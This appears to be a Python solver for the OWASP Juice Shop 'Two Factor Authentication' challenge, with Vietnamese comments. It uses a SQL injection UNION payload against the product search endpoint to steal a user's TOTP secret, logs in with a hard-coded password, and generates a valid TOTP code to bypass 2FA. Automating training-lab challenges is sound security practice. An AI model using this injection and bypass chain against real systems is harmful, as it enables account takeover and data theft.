from core.base_solver import BaseSolver
from loguru import logger
import hmac
import struct
import hashlib
import time
import base64

def get_totp_token(secret: str) -> str:
    """Tạo mã TOTP 6 số từ secret."""
    padding = len(secret) % 8
    if padding != 0: 
        secret += '=' * (8 - padding)
    key = base64.b32decode(secret, casefold=True)
    msg = struct.pack(">Q", int(time.time()) // 30)
    h = hmac.new(key, msg, hashlib.sha1).digest()
    o = h[19] & 15
    code = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
    return str(code).zfill(6)

class TwoFactorAuthSolver(BaseSolver):
    """
    Challenge: Two Factor Authentication (twoFactorAuthUnsafeSecretStorageChallenge)
    
    Bypass 2FA bằng cách:
    1. Lấy TOTP secret qua SQLi trên /rest/products/search
    2. Đăng nhập để lấy tmpToken
    3. Tự sinh mã TOTP và xác thực
    """
    @property
    def challenge_key(self) -> str:
        return "twoFactorAuthUnsafeSecretStorageChallenge"

    def solve(self) -> bool:
        # SQLi lấy totpSecret
        injection = "nonexistent')) UNION SELECT id,'2','3',email,password,totpSecret,'7','8','9' FROM Users WHERE email='wurstbrot@juice-sh.op'-- "
        res = self.client.get("/rest/products/search", params={"q": injection})
        
        totp_secret = None
        if res.ok:
            for item in res.json().get("data", []):
                if item.get("price") == "wurstbrot@juice-sh.op":
                    totp_secret = item.get("image")
                    logger.info(f"Found TOTP secret: {totp_secret}")
                    break
        
        if not totp_secret:
            logger.error("Could not find TOTP secret")
            return False
        
        # Đăng nhập với mật khẩu đã biết
        creds = {"email": "wurstbrot@juice-sh.op", "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"}
        login_res = self.client.post("/rest/user/login", json=creds)
        
        if not login_res.ok:
            logger.error("Login failed for wurstbrot")
            return False
        
        tmp_token = login_res.json().get("authentication", {}).get("token")
        
        # Xác thực 2FA
        totp_code = get_totp_token(totp_secret)
        verify_payload = {"totpToken": totp_code, "tmpToken": tmp_token}
        verify_res = self.client.post("/rest/2fa/verify", json=verify_payload)
        
        if verify_res.ok:
            logger.info("2FA bypass successful for wurstbrot!")
            return True
        else:
            logger.error(f"2FA verification failed: {verify_res.status_code}")
            return False
